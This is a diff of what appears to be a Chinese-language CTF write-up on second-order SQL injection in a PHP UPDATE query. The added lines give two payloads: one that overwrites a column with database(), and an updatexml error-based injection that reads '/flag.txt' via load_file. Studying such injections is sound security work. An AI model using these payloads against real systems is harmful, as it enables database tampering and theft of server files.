@@ -126,6 +126,13 @@ $sql = "update `user` set `address`='".$address."', `old_address`='".$row['addre
 如果在代码中可知
 update语句中，在update后面有注入，
 即old_address=$row['address']
+```
+1、修改前面字段值
+```
 可以通过注入修改此时的前面字段的值，如address字段
-将address
+'.`address`=database()#
+```
+2、where报错注入
+```
+1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,30)),0x7e),1)#
 ```
